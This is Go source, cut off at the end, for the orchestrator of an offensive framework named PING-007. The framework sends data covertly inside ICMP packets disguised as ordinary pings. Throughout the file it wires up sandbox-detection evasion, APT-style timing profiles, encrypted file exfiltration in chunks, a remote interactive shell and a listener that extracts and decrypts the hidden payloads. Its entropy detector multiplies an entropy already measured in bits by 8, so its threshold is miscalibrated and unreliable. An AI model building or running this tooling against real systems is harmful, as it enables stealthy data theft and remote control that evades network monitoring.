package orchestrator

import (
	"context"
	"crypto/rand"
	"fmt"
	"math"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"ping007/internal/config"
	"ping007/internal/crypto"
	"ping007/internal/evasion"
	"ping007/internal/exfiltration"
	"ping007/internal/logger"
	"ping007/internal/network"
	"ping007/internal/shell"
	"ping007/pkg/types"
)

type Orchestrator struct {
	config            *config.Config
	logger            *logger.Logger
	networkService    *network.NetworkService
	cryptoEngine      *crypto.CryptoEngine
	evasionEngine     *evasion.EvasionEngine
	exfiltrationEngine *exfiltration.ExfiltrationEngine
	shellEngine       *shell.ShellEngine
	sessionID         string
	startTime         time.Time
	privilegedMode    bool
	mu                sync.RWMutex
}

type StatusOptions struct {
	SafeMode  bool
	NoNetwork bool
}

func New(cfg *config.Config, log *logger.Logger) (*Orchestrator, error) {
	return NewWithPrivileges(cfg, log, true)
}

func NewWithPrivileges(cfg *config.Config, log *logger.Logger, privileged bool) (*Orchestrator, error) {
	// Generate unique session ID
	sessionID, err := generateSessionID()
	if err != nil {
		return nil, fmt.Errorf("failed to generate session ID: %w", err)
	}

	orch := &Orchestrator{
		config:         cfg,
		logger:         log,
		sessionID:      sessionID,
		startTime:      time.Now(),
		privilegedMode: privileged,
	}

	// Initialize components
	if err := orch.initializeComponents(); err != nil {
		return nil, fmt.Errorf("failed to initialize components: %w", err)
	}

	// Create required directories
	if err := cfg.EnsureDirectories(); err != nil {
		log.Warn("Failed to create some directories", "error", err)
	}

	log.Info("PING-007 Orchestrator initialized",
		"session_id", sessionID,
		"version", cfg.Framework.Version,
		"environment", cfg.Framework.Environment)

	return orch, nil
}

// initializeComponents sets up all framework components
func (o *Orchestrator) initializeComponents() error {
	var err error

	// Initialize network service (only if privileged)
	if o.privilegedMode {
		networkConfig := network.NetworkConfig{
			DefaultInterface: o.config.Network.DefaultInterface,
			Timeout:          time.Duration(o.config.Network.Timeout) * time.Second,
			MaxPacketSize:    o.config.Network.MaxPacketSize,
		}

		o.networkService, err = network.NewNetworkService(networkConfig, o.sessionID)
		if err != nil {
			return fmt.Errorf("failed to create network service: %w", err)
		}
	} else {
		o.logger.Info("Running in unprivileged mode - network service disabled")
	}

	// Initialize crypto engine
	cryptoConfig := crypto.CryptoConfig{
		Enabled:          o.config.Evasion.CryptoAgility.Enabled,
		Algorithms:       o.config.Evasion.CryptoAgility.Algorithms,
		RotationInterval: time.Duration(o.config.Evasion.CryptoAgility.RotationInterval) * time.Second,
		DefaultAlgorithm: o.config.Evasion.CryptoAgility.DefaultAlgorithm,
	}

	o.cryptoEngine, err = crypto.NewCryptoEngine(cryptoConfig)
	if err != nil {
		return fmt.Errorf("failed to create crypto engine: %w", err)
	}

	// Initialize evasion engine
	evasionConfig := evasion.EvasionConfig{
		CryptoAgility: o.config.Evasion.CryptoAgility.Enabled,
		AntiSandbox: evasion.AntiSandboxConfig{
			Enabled:      o.config.Evasion.AntiSandbox.Enabled,
			StrictMode:   o.config.Evasion.AntiSandbox.StrictMode,
			Checks:       o.config.Evasion.AntiSandbox.Checks,
			MinUptime:    time.Duration(o.config.Evasion.AntiSandbox.MinUptime) * time.Second,
			MinProcesses: o.config.Evasion.AntiSandbox.MinProcesses,
		},
		TimingEvasion: evasion.TimingEvasionConfig{
			Enabled:          o.config.Evasion.TimingEvasion.Enabled,
			AdaptiveDelays:   o.config.Evasion.TimingEvasion.AdaptiveDelays,
			ServiceMimicry:   o.config.Evasion.TimingEvasion.ServiceMimicry,
			JitterPercentage: o.config.Evasion.TimingEvasion.JitterPercentage,
		},
		TrafficAnalysisResistance: o.config.Evasion.TrafficAnalysisResistance,
		PaddingSizes:              o.config.Evasion.PaddingSizes,
		FakeDataInjectionRate:     o.config.Evasion.FakeDataInjectionRate,
	}

	o.evasionEngine, err = evasion.NewEvasionEngine(evasionConfig)
	if err != nil {
		return fmt.Errorf("failed to create evasion engine: %w", err)
	}

	// Initialize exfiltration engine
	exfilConfig := exfiltration.ExfiltrationConfig{
		MaxConcurrentJobs: 5,
		DefaultChunkSize:  512,
		MaxRetries:        3,
		ChunkTimeout:      30 * time.Second,
	}

	o.exfiltrationEngine = exfiltration.NewExfiltrationEngine(
		o.networkService,
		o.cryptoEngine,
		o.evasionEngine,
		exfilConfig,
	)

	// Initialize shell engine
	shellConfig := shell.ShellConfig{
		MaxSessions:       10,
		SessionTimeout:    1 * time.Hour,
		CommandTimeout:    30 * time.Second,
		MaxOutputSize:     64 * 1024, // 64KB
		EncryptionEnabled: true,
	}

	o.shellEngine = shell.NewShellEngine(
		o.networkService,
		o.cryptoEngine,
		shellConfig,
	)

	return nil
}

// Status displays framework status and health check
func (o *Orchestrator) Status(ctx context.Context) error {
	return o.StatusWithOptions(ctx, &StatusOptions{SafeMode: false, NoNetwork: false})
}

// StatusWithOptions displays framework status with specific options
func (o *Orchestrator) StatusWithOptions(ctx context.Context, options *StatusOptions) error {
	o.logger.Info("Framework status requested", "safe_mode", options.SafeMode, "no_network", options.NoNetwork)

	// Perform sandbox check (only if not in safe mode)
	var sandboxResult *types.SandboxDetectionResult
	var err error
	if !options.SafeMode && o.evasionEngine != nil {
		sandboxResult, err = o.evasionEngine.PerformSandboxCheck()
		if err != nil {
			o.logger.Warn("Sandbox check failed", "error", err)
		}
	}

	// Get network metrics (only if network enabled and privileged)
	var networkMetrics *types.NetworkMetrics
	if !options.NoNetwork && o.networkService != nil {
		networkMetrics = o.networkService.GetMetrics()
	}

	// Get session stats (if engines available)
	var shellStats map[string]any
	var exfilStats map[string]any
	if o.shellEngine != nil {
		shellStats = o.shellEngine.GetSessionStats()
	}
	if o.exfiltrationEngine != nil {
		exfilStats = o.exfiltrationEngine.GetJobStats()
	}

	// Display status
	fmt.Println("\nPING-007 Framework Status")
	fmt.Println("═══════════════════════════════════════")

	// Framework info
	fmt.Printf("Version:     %s\n", o.config.Framework.Version)
	fmt.Printf("Environment: %s\n", o.config.Framework.Environment)
	fmt.Printf("Session ID:  %s\n", o.sessionID)
	fmt.Printf("Uptime:      %s\n", time.Since(o.startTime).Round(time.Second))
	fmt.Printf("Debug Mode:  %t\n", o.config.Framework.DebugMode)
	fmt.Printf("Privileged:  %t\n", o.privilegedMode)

	if options.SafeMode {
		fmt.Printf("Mode:        Safe Mode (limited functionality)\n")
	}
	if options.NoNetwork {
		fmt.Printf("Network:     Disabled (no raw sockets)\n")
	}

	// System info
	fmt.Println("\nSystem Information:")
	fmt.Printf("OS:          %s/%s\n", runtime.GOOS, runtime.GOARCH)
	fmt.Printf("Go Version:  %s\n", runtime.Version())
	fmt.Printf("CPUs:        %d\n", runtime.NumCPU())

	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)
	fmt.Printf("Memory:      %d MB allocated, %d MB system\n",
		memStats.Alloc/1024/1024,
		memStats.Sys/1024/1024)

	// Sandbox detection
	fmt.Println("\nSecurity Status:")
	if sandboxResult != nil {
		fmt.Printf("Sandbox Detection: %s (confidence: %.1f%%)\n",
			map[bool]string{true: "DETECTED", false: "CLEAR"}[sandboxResult.IsSandbox],
			sandboxResult.Confidence*100)

		if len(sandboxResult.Indicators) > 0 {
			fmt.Printf("Indicators:        %v\n", sandboxResult.Indicators)
		}
	}

	fmt.Printf("Crypto Algorithm:  %s\n", o.cryptoEngine.GetActiveAlgorithm())
	fmt.Printf("Audit Logging:     %t\n", o.config.Security.AuditLogging)

	// Network status
	fmt.Println("\nNetwork Status:")
	if networkMetrics != nil {
		fmt.Printf("Interface:       %s\n", o.config.Network.DefaultInterface)
		fmt.Printf("Packets Sent:    %d\n", networkMetrics.PacketsSent)
		fmt.Printf("Packets Received: %d\n", networkMetrics.PacketsReceived)
		fmt.Printf("Bytes Transmitted: %d\n", networkMetrics.BytesTransmitted)
		fmt.Printf("Errors:          %d\n", networkMetrics.Errors)
		if networkMetrics.LatencyMs > 0 {
			fmt.Printf("Latency:         %.2f ms\n", networkMetrics.LatencyMs)
		}
	} else {
		fmt.Printf("Status:          Disabled (no privileged mode)\n")
		fmt.Printf("Interface:       %s (configured)\n", o.config.Network.DefaultInterface)
		fmt.Printf("Note:            Raw sockets require root privileges\n")
	}

	// Active operations
	fmt.Println("\nActive Operations:")
	if shellStats != nil {
		fmt.Printf("Shell Sessions:   %v\n", shellStats["active_sessions"])
	} else {
		fmt.Printf("Shell Sessions:   Not available (unprivileged mode)\n")
	}
	if exfilStats != nil {
		fmt.Printf("Exfil Jobs:       %v\n", exfilStats["active_jobs"])
	} else {
		fmt.Printf("Exfil Jobs:       Not available (unprivileged mode)\n")
	}

	// Target validation
	fmt.Println("\nTarget Configuration:")
	fmt.Printf("Authorized Ranges: %d\n", len(o.config.Network.AuthorizedTargets))
	for _, target := range o.config.Network.AuthorizedTargets {
		fmt.Printf("  - %s\n", target)
	}

	fmt.Println("\nAll systems operational")
	return nil
}

type BasicOptions struct {
	Target      string
	Data        string
	Interactive bool
	Stealth     bool
	Signature   string
}

// Basic performs basic ICMP transmission
func (o *Orchestrator) Basic(ctx context.Context, options *BasicOptions) error {
	o.logger.Info("Basic ICMP operation started",
		"target", options.Target,
		"interactive", options.Interactive)

	// Validate target
	if err := o.config.ValidateTarget(options.Target); err != nil {
		return fmt.Errorf("target validation failed: %w", err)
	}

	// Log security event
	o.logger.LogNetworkActivity(options.Target, 0, 0, 0)

	if options.Interactive {
		return o.runInteractiveBasic(ctx, options)
	}

	// Send packet(s) - use stealth mode if requested
	packetBuilder := network.NewPacketBuilder(o.sessionID)
	var packets []*types.NetworkPacket

	if options.Stealth {
		// Stealth mode - create packets that mimic legitimate ping
		data := []byte(options.Data)
		if len(data) <= getMaxDataSize(options.Signature) {
			packet := packetBuilder.CreateStealthPacketWithSignature(data, false, options.Signature)
			packets = []*types.NetworkPacket{packet}
		} else {
			packets = packetBuilder.CreateStealthChunksWithSignature(data, options.Signature)
		}
	} else {
		// Normal mode - create basic packet
		packet := packetBuilder.CreateDataPacket([]byte(options.Data), "basic")
		packets = []*types.NetworkPacket{packet}
	}

	// Send packet(s)
	var totalLatency time.Duration
	for i, packet := range packets {
		if options.Stealth && i > 0 {
			// Wait 1 second between stealth packets to mimic ping timing
			fmt.Printf("Waiting 1 second (legitimate ping timing)...\n")
			time.Sleep(1 * time.Second)
		}

		startTime := time.Now()
		err := o.networkService.SendPacket(packet, options.Target)
		latency := time.Since(startTime)
		totalLatency += latency

		if err != nil {
			o.logger.Error("Basic transmission failed", "target", options.Target, "packet", i+1, "error", err)
			return fmt.Errorf("transmission failed on packet %d: %w", i+1, err)
		}

		if options.Stealth {
			fmt.Printf("Stealth packet %d/%d sent (64 bytes, mimics ping)\n", i+1, len(packets))
		} else {
			fmt.Printf("Packet %d/%d sent (%d bytes)\n", i+1, len(packets), len(packet.Payload)+8)
		}
	}

	// Update metrics
	o.networkService.UpdateLatency(totalLatency)

	// Summary
	if options.Stealth {
		fmt.Printf("Stealth transmission complete to %s\n", options.Target)
		fmt.Printf("Data: %s\n", options.Data)
		fmt.Printf("Packets: %d x 64 bytes (standard ping size)\n", len(packets))
		fmt.Printf("Total latency: %v\n", totalLatency.Round(time.Millisecond))
	} else {
		fmt.Printf("Basic ICMP packet sent to %s\n", options.Target)
		fmt.Printf("Data: %s\n", options.Data)
		fmt.Printf("Latency: %v\n", totalLatency.Round(time.Millisecond))
	}

	return nil
}

// runInteractiveBasic runs interactive basic mode
func (o *Orchestrator) runInteractiveBasic(ctx context.Context, options *BasicOptions) error {
	fmt.Printf("Interactive Basic Mode\n")
	fmt.Printf("Target: %s\n", options.Target)
	fmt.Println("Enter messages (empty line to quit):")

	for {
		var input string
		fmt.Print("ping-007> ")
		fmt.Scanln(&input)

		if input == "" {
			break
		}

		packet := network.NewPacketBuilder(o.sessionID).CreateDataPacket([]byte(input), "interactive")
		startTime := time.Now()

		if err := o.networkService.SendPacket(packet, options.Target); err != nil {
			fmt.Printf("Error: %v\n", err)
			continue
		}

		latency := time.Since(startTime)
		fmt.Printf("Sent in %v\n", latency.Round(time.Millisecond))
	}

	return nil
}

type StealthOptions struct {
	Target string
	Data   string
}

// Stealth performs stealth transmission with evasion techniques
func (o *Orchestrator) Stealth(ctx context.Context, options *StealthOptions) error {
	o.logger.Info("Stealth operation started", "target", options.Target)

	// Validate target
	if err := o.config.ValidateTarget(options.Target); err != nil {
		return fmt.Errorf("target validation failed: %w", err)
	}

	// Perform sandbox check
	sandboxResult, err := o.evasionEngine.PerformSandboxCheck()
	if err != nil {
		o.logger.Warn("Sandbox check failed", "error", err)
	} else if sandboxResult.IsSandbox {
		o.logger.Warn("Sandbox detected", "confidence", sandboxResult.Confidence)
		fmt.Printf("Warning: Sandbox environment detected (confidence: %.1f%%)\n", sandboxResult.Confidence*100)
		fmt.Printf("Indicators: %v\n", sandboxResult.Indicators)

		// In production, might want to exit here
		fmt.Println("Continuing anyway for demonstration...")
	}

	// Generate timing profile
	profile, err := o.evasionEngine.GenerateTimingProfile(types.APTLazarus)
	if err != nil {
		return fmt.Errorf("failed to generate timing profile: %w", err)
	}

	// Calculate delay
	delay, err := o.evasionEngine.CalculateAdaptiveDelay(profile, len(options.Data))
	if err != nil {
		o.logger.Warn("Failed to calculate delay", "error", err)
		delay = 5 * time.Second // Default delay
	}

	fmt.Printf("Stealth Mode Engaged\n")
	fmt.Printf("Target: %s\n", options.Target)
	fmt.Printf("Evasion delay: %v\n", delay.Round(time.Millisecond))

	// Apply delay
	if delay > 0 {
		fmt.Printf("Waiting %v for stealth timing...\n", delay.Round(time.Second))
		time.Sleep(delay)
	}

	// Obfuscate data
	obfuscatedData, err := o.evasionEngine.ObfuscateData([]byte(options.Data))
	if err != nil {
		o.logger.Warn("Data obfuscation failed", "error", err)
		obfuscatedData = []byte(options.Data)
	}

	// Create cryptographic context for Additional Associated Data
	cryptoContext := &crypto.ContextualData{
		TargetIP:   options.Target,
		SourceIP:   "local",  // Could be detected dynamically
		SessionID:  o.sessionID,
		SequenceID: 1,  // Could be incremented per message
		Timestamp:  time.Now().Unix(),
		PacketType: "stealth",
	}

	// Encrypt data with contextual binding
	encryptedData, err := o.cryptoEngine.EncryptWithContext(obfuscatedData, cryptoContext)
	if err != nil {
		o.logger.Warn("Encryption failed", "error", err)
		encryptedData = obfuscatedData
	}

	// Create stealth packets with chunking if necessary
	packetBuilder := network.NewPacketBuilder(o.sessionID)
	var packets []*types.NetworkPacket

	// Check if data needs chunking (> 48 bytes of actual data)
	if len(encryptedData) <= 48 {
		// Single packet
		packet := packetBuilder.CreateStealthPacket(encryptedData, true)
		packets = []*types.NetworkPacket{packet}
	} else {
		// Multiple packets with chunking
		packets = packetBuilder.CreateStealthChunks(encryptedData)
		fmt.Printf("Large data chunked into %d stealth packets\n", len(packets))
	}

	// Send packets with legitimate ping timing (1 second intervals)
	var totalLatency time.Duration
	for i, packet := range packets {
		if i > 0 {
			// Wait 1 second between packets to mimic legitimate ping
			fmt.Printf("Waiting 1 second (legitimate ping timing)...\n")
			time.Sleep(1 * time.Second)
		}

		startTime := time.Now()
		err = o.networkService.SendPacket(packet, options.Target)
		latency := time.Since(startTime)
		totalLatency += latency

		if err != nil {
			o.logger.Error("Stealth transmission failed", "packet", i+1, "error", err)
			return fmt.Errorf("stealth transmission failed on packet %d: %w", i+1, err)
		}

		fmt.Printf("Stealth packet %d/%d transmitted (64 bytes, mimics ping)\n", i+1, len(packets))
	}

	// Log evasion activity
	o.logger.LogEvasionActivity("crypto_agility", true, 0.9)
	o.logger.LogEvasionActivity("timing_evasion", true, 0.8)
	o.logger.LogEvasionActivity("payload_mimicry", true, 0.95)

	fmt.Printf("Stealth transmission complete\n")
	fmt.Printf("Original size: %d bytes\n", len(options.Data))
	fmt.Printf("Encrypted size: %d bytes\n", len(encryptedData))
	fmt.Printf("Transmitted packets: %d x 64 bytes (standard ping size)\n", len(packets))
	fmt.Printf("Total latency: %v\n", totalLatency.Round(time.Millisecond))

	return nil
}

// getMaxDataSize returns maximum data capacity for signature type
func getMaxDataSize(signature string) int {
	switch signature {
	case "windows":
		return 24 // 32 - 8 bytes for pattern = 24 bytes max data
	case "linux":
		fallthrough
	default:
		return 48 // 56 - 8 bytes for pattern = 48 bytes max data
	}
}

type APTOptions struct {
	Target   string
	Profile  string
	Duration int // seconds
}

// APT performs APT simulation
func (o *Orchestrator) APT(ctx context.Context, options *APTOptions) error {
	o.logger.Info("APT simulation started",
		"target", options.Target,
		"profile", options.Profile,
		"duration", options.Duration)

	// Validate target
	if err := o.config.ValidateTarget(options.Target); err != nil {
		return fmt.Errorf("target validation failed: %w", err)
	}

	// Get APT profile
	aptProfile := types.APTProfile(options.Profile)
	profileConfig, err := o.config.GetAPTProfile(aptProfile)
	if err != nil {
		return fmt.Errorf("invalid APT profile: %w", err)
	}

	fmt.Printf("APT Simulation: %s\n", profileConfig.Description)
	fmt.Printf("Target: %s\n", options.Target)
	fmt.Printf("Duration: %d seconds\n", options.Duration)

	// Generate timing profile
	timingProfile, err := o.evasionEngine.GenerateTimingProfile(aptProfile)
	if err != nil {
		return fmt.Errorf("failed to generate timing profile: %w", err)
	}

	// Run simulation
	endTime := time.Now().Add(time.Duration(options.Duration) * time.Second)
	packetCount := 0

	for time.Now().Before(endTime) {
		select {
		case <-ctx.Done():
			fmt.Println("\nSimulation cancelled")
			return ctx.Err()
		default:
		}

		// Calculate delay
		delay, err := o.evasionEngine.CalculateAdaptiveDelay(timingProfile, 64)
		if err != nil {
			delay = 30 * time.Second // Default for APT
		}

		// Generate APT-like data
		aptData := generateAPTData(aptProfile, packetCount)

		// Create cryptographic context for APT simulation
		cryptoContext := &crypto.ContextualData{
			TargetIP:   options.Target,
			SourceIP:   "apt-simulation",
			SessionID:  o.sessionID,
			SequenceID: uint64(packetCount),
			Timestamp:  time.Now().Unix(),
			PacketType: fmt.Sprintf("apt-%s", options.Profile),
		}

		// Encrypt data with contextual binding
		encryptedData, err := o.cryptoEngine.EncryptWithContext([]byte(aptData), cryptoContext)
		if err != nil {
			encryptedData = []byte(aptData)
		}

		// Send packet
		packet := network.NewPacketBuilder(o.sessionID).CreateStealthPacket(encryptedData, true)
		packet.Headers["apt_profile"] = string(aptProfile)
		packet.Headers["packet_sequence"] = packetCount

		err = o.networkService.SendPacket(packet, options.Target)
		if err != nil {
			o.logger.Warn("APT packet failed", "error", err)
		} else {
			packetCount++
			fmt.Printf("APT packet %d sent (delay: %v)\n", packetCount, delay.Round(time.Second))
		}

		// Apply timing delay
		time.Sleep(delay)
	}

	fmt.Printf("APT simulation completed: %d packets sent\n", packetCount)
	return nil
}

type ExfilOptions struct {
	Target    string
	File      string
	Method    string
	Mode      string
	ChunkSize int
	Stealth   bool
	Encrypt   bool
}

// Exfiltrate performs data exfiltration
func (o *Orchestrator) Exfiltrate(ctx context.Context, options *ExfilOptions) error {
	o.logger.Info("Exfiltration operation started",
		"target", options.Target,
		"file", options.File,
		"method", options.Method,
		"mode", options.Mode)

	// Validate target
	if err := o.config.ValidateTarget(options.Target); err != nil {
		return fmt.Errorf("target validation failed: %w", err)
	}

	// Create exfiltration job
	jobID, err := generateJobID()
	if err != nil {
		return fmt.Errorf("failed to generate job ID: %w", err)
	}

	job := &types.ExfilJob{
		ID:             jobID,
		SourcePath:     options.File,
		Target:         options.Target,
		Method:         types.ExfiltrationMethod(options.Method),
		Mode:           types.ExfiltrationMode(options.Mode),
		ChunkSize:      options.ChunkSize,
		MaxRetries:     3,
		StealthEnabled: options.Stealth,
		EncryptEnabled: options.Encrypt,
		Metadata:       make(map[string]any),
		CreatedAt:      time.Now(),
	}

	fmt.Printf("Data Exfiltration Started\n")
	fmt.Printf("Job ID: %s\n", job.ID)
	fmt.Printf("File: %s\n", options.File)
	fmt.Printf("Target: %s\n", options.Target)
	fmt.Printf("Method: %s\n", options.Method)
	fmt.Printf("Mode: %s\n", options.Mode)
	fmt.Printf("Chunk Size: %d bytes\n", options.ChunkSize)

	// Execute exfiltration
	result, err := o.exfiltrationEngine.ExfiltrateFile(job)
	if err != nil {
		o.logger.Error("Exfiltration failed", "job_id", jobID, "error", err)
		return fmt.Errorf("exfiltration failed: %w", err)
	}

	// Log the operation
	o.logger.LogExfiltrationEvent(jobID, options.Target, options.Method, result.BytesSent, result.Success)

	// Display results
	fmt.Printf("\nExfiltration Completed\n")
	fmt.Printf("Success: %t\n", result.Success)
	fmt.Printf("Chunks sent: %d/%d\n", result.ChunksSent, result.ChunksTotal)
	fmt.Printf("Bytes sent: %d\n", result.BytesSent)
	fmt.Printf("Duration: %v\n", result.Duration.Round(time.Millisecond))

	if len(result.Errors) > 0 {
		fmt.Println("Errors:")
		for _, err := range result.Errors {
			fmt.Printf("  - %s\n", err)
		}
	}

	return nil
}

type ShellOptions struct {
	Target string
	Mode   string
}

// Shell starts interactive shell
func (o *Orchestrator) Shell(ctx context.Context, options *ShellOptions) error {
	o.logger.Info("Shell operation started", "target", options.Target, "mode", options.Mode)

	// Validate target
	if err := o.config.ValidateTarget(options.Target); err != nil {
		return fmt.Errorf("target validation failed: %w", err)
	}

	// Generate session ID for shell
	shellSessionID, err := generateSessionID()
	if err != nil {
		return fmt.Errorf("failed to generate shell session ID: %w", err)
	}

	// Start interactive shell
	return o.shellEngine.InteractiveShell(shellSessionID, options.Target)
}

type ListenOptions struct {
	Interface string
	Output    string
	Method    string
	Timeout   int
}

// Listen starts data listener
func (o *Orchestrator) Listen(ctx context.Context, options *ListenOptions) error {
	o.logger.Info("Listen mode started",
		"interface", options.Interface,
		"output", options.Output,
		"method", options.Method,
		"timeout", options.Timeout)

	fmt.Printf("PING-007 Listener Mode\n")
	fmt.Printf("Interface: %s\n", options.Interface)
	fmt.Printf("Output: %s\n", options.Output)
	fmt.Printf("Method: %s\n", options.Method)
	fmt.Printf("Timeout: %d seconds\n", options.Timeout)
	fmt.Println("Listening for incoming data...")

	// Create output directory
	if err := os.MkdirAll(options.Output, 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %w", err)
	}

	timeout := time.Duration(options.Timeout) * time.Second
	endTime := time.Now().Add(timeout)

	for time.Now().Before(endTime) {
		select {
		case <-ctx.Done():
			fmt.Println("\nListener stopped")
			return ctx.Err()
		default:
		}

		// Receive packet
		packet, err := o.networkService.ReceivePacket(1 * time.Second)
		if err != nil {
			continue // Timeout, keep listening
		}

		fmt.Printf("Received packet from %s (%d bytes)\n",
			packet.Metadata.SourceIP,
			packet.Metadata.Size)

		// Extract hidden data from steganography
		hiddenData, err := o.extractStealthData(packet.Payload)
		if err != nil {
			fmt.Printf("Warning: Failed to extract steganography data: %v\n", err)
			continue
		}

		if len(hiddenData) == 0 {
			fmt.Printf("Warning: No hidden data found in packet\n")
			continue
		}

		fmt.Printf("Extracted %d bytes of hidden data\n", len(hiddenData))

		// Try to decrypt the extracted data with automatic algorithm detection
		var finalData []byte
		if o.cryptoEngine != nil {
			// Create context with available information (for AAD binding)
			cryptoContext := &crypto.ContextualData{
				TargetIP:   "local",  // Receiver IP (could be detected)
				SourceIP:   packet.Metadata.SourceIP,
				SessionID:  packet.Metadata.SessionID,
				SequenceID: uint64(packet.Metadata.SequenceID),
				Timestamp:  packet.Metadata.Timestamp.Unix(),
				PacketType: "unknown", // Will try multiple types
			}

			// Try decryption with automatic algorithm detection
			var decryptedData []byte
			var detectedAlgorithm types.CryptoAlgorithm
			var err error

			// Try common packet types with algorithm auto-detection
			packetTypes := []string{"stealth", fmt.Sprintf("apt-%s", "lazarus"), fmt.Sprintf("apt-%s", "apt29"), fmt.Sprintf("apt-%s", "apt28"), "basic"}

			for _, packetType := range packetTypes {
				cryptoContext.PacketType = packetType
				decryptedData, detectedAlgorithm, err = o.cryptoEngine.DecryptWithAlgorithmDetection(hiddenData, cryptoContext)
				if err == nil {
					fmt.Printf("Successfully decrypted with algorithm: %s, packet type: %s\n", detectedAlgorithm, packetType)
					break
				}
			}

			// If all attempts failed, try legacy decryption without context
			if err != nil {
				fmt.Printf("Warning: Algorithm detection failed, trying legacy mode...\n")
				decryptedData, err = o.cryptoEngine.Decrypt(hiddenData)
				if err == nil {
					fmt.Printf("Successfully decrypted in legacy mode\n")
				}
			}

			if err != nil {
				fmt.Printf("Warning: All decryption attempts failed (wrong password or context): %v\n", err)
				fmt.Printf("Saving raw extracted data instead\n")
				finalData = hiddenData
			} else {
				fmt.Printf("Successfully decrypted data (%d bytes)\n", len(decryptedData))
				finalData = decryptedData
			}
		} else {
			finalData = hiddenData
		}

		// Save processed data
		outputFile := fmt.Sprintf("%s/received_%s_%d.bin",
			options.Output,
			packet.Metadata.SourceIP,
			packet.Metadata.Timestamp.Unix())

		if err := os.WriteFile(outputFile, finalData, 0644); err != nil {
			o.logger.Warn("Failed to save received data", "error", err)
		} else {
			fmt.Printf("Saved to: %s\n", outputFile)

			// Also save raw payload for debugging
			rawFile := fmt.Sprintf("%s/raw_%s_%d.bin",
				options.Output,
				packet.Metadata.SourceIP,
				packet.Metadata.Timestamp.Unix())
			os.WriteFile(rawFile, packet.Payload, 0644)
		}
	}

	fmt.Println("Listener session completed")
	return nil
}

type AnalyzeOptions struct {
	Duration int
	Passive  bool
}

// Analyze performs network analysis
func (o *Orchestrator) Analyze(ctx context.Context, options *AnalyzeOptions) error {
	o.logger.Info("Analysis mode started", "duration", options.Duration, "passive", options.Passive)

	fmt.Printf("PING-007 Network Analysis\n")
	fmt.Printf("Duration: %d seconds\n", options.Duration)

	if options.Passive {
		fmt.Printf("Mode: Passive Mode (no raw sockets)\n")
	}

	// Check if network service is available and not in passive mode
	if options.Passive || o.networkService == nil {
		fmt.Printf("\nPassive Analysis Mode\n")
		fmt.Printf("Network monitoring disabled (no raw sockets)\n")
		fmt.Printf("Available analysis capabilities:\n")
		fmt.Printf("  - Framework status checks\n")
		fmt.Printf("  - Configuration validation\n")
		fmt.Printf("  - System information gathering\n")

		// Simulate passive analysis
		time.Sleep(2 * time.Second)

		fmt.Printf("\nPassive analysis completed\n")
		fmt.Printf("Note: Use privileged mode for active packet capture\n")
		return nil
	}

	endTime := time.Now().Add(time.Duration(options.Duration) * time.Second)
	packetCount := 0

	for time.Now().Before(endTime) {
		select {
		case <-ctx.Done():
			fmt.Println("\nAnalysis stopped")
			return ctx.Err()
		default:
		}

		packet, err := o.networkService.ReceivePacket(1 * time.Second)
		if err != nil {
			continue
		}

		packetCount++
		fmt.Printf("Packet %d: %s -> size=%d protocol=%s\n",
			packetCount,
			packet.Metadata.SourceIP,
			packet.Metadata.Size,
			packet.Metadata.Protocol)

		// Analyze for potential PING-007 traffic
		if o.analyzeForFrameworkTraffic(packet) {
			fmt.Printf("  Potential PING-007 traffic detected!\n")
		}
	}

	metrics := o.networkService.GetMetrics()
	fmt.Printf("\nAnalysis Complete:\n")
	fmt.Printf("Packets analyzed: %d\n", packetCount)
	fmt.Printf("Total packets received: %d\n", metrics.PacketsReceived)
	fmt.Printf("Total bytes: %d\n", metrics.BytesReceived)

	return nil
}

// analyzeForFrameworkTraffic checks if packet might be from PING-007
func (o *Orchestrator) analyzeForFrameworkTraffic(packet *types.NetworkPacket) bool {
	// Check for OLD framework patterns (legacy detection)
	if sessionID, exists := packet.Headers["session_id"]; exists {
		if sid, ok := sessionID.(string); ok && strings.HasPrefix(sid, "ping007-") {
			return true // Old detectable format
		}
	}

	// Check payload for encrypted patterns (high entropy)
	if len(packet.Payload) > 0 {
		entropy := calculateEntropy(packet.Payload)

		// Ignore legitimate ping patterns (sequential bytes starting 0x08)
		if o.isLegitimateLinuxPing(packet.Payload) {
			return false // Legitimate Linux ping pattern
		}

		if entropy > 7.5 { // High entropy suggests encryption
			return true
		}
	}

	return false
}

// isLegitimateLinuxPing checks if payload matches Linux ping pattern
func (o *Orchestrator) isLegitimateLinuxPing(payload []byte) bool {
	if len(payload) != 56 {
		return false // Linux ping uses 56-byte payload
	}

	// Check if bytes 8-15 follow sequential pattern (0x08, 0x09, 0x0a...)
	for i := 8; i < 16; i++ {
		if payload[i] != byte(i) {
			// Allow some variation for hidden data (XOR steganography)
			// But basic pattern should be recognizable
			diff := payload[i] ^ byte(i)
			if diff > 127 { // Too much deviation from pattern
				return false
			}
		}
	}

	return true // Looks like legitimate Linux ping
}

// Close shuts down the orchestrator and all components
func (o *Orchestrator) Close() error {
	o.logger.Info("Shutting down orchestrator")

	var firstErr error

	if o.networkService != nil {
		if err := o.networkService.Close(); err != nil && firstErr == nil {
			firstErr = err
		}
	}

	if o.cryptoEngine != nil {
		if err := o.cryptoEngine.Close(); err != nil && firstErr == nil {
			firstErr = err
		}
	}

	if o.logger != nil {
		if err := o.logger.Close(); err != nil && firstErr == nil {
			firstErr = err
		}
	}

	return firstErr
}

// Helper functions

func generateSessionID() (string, error) {
	bytes := make([]byte, 8)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return fmt.Sprintf("ping007-%x", bytes), nil
}

func generateJobID() (string, error) {
	bytes := make([]byte, 6)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return fmt.Sprintf("exfil-%x", bytes), nil
}

func generateAPTData(profile types.APTProfile, sequence int) string {
	return fmt.Sprintf("%s-data-packet-%d-%d", profile, sequence, time.Now().Unix())
}

func calculateEntropy(data []byte) float64 {
	if len(data) == 0 {
		return 0
	}

	// Count frequency of each byte
	freq := make(map[byte]int)
	for _, b := range data {
		freq[b]++
	}

	// Calculate Shannon entropy
	var entropy float64
	length := float64(len(data))

	for _, count := range freq {
		if count > 0 {
			p := float64(count) / length
			entropy -= p * math.Log2(p)
		}
	}

	return entropy * 8 // Convert to bits
}

// SetPassword updates the shared password for all crypto providers
func (o *Orchestrator) SetPassword(password string) error {
	o.mu.Lock()
	defer o.mu.Unlock()

	if o.cryptoEngine == nil {
		return fmt.Errorf("crypto engine not initialized")
	}

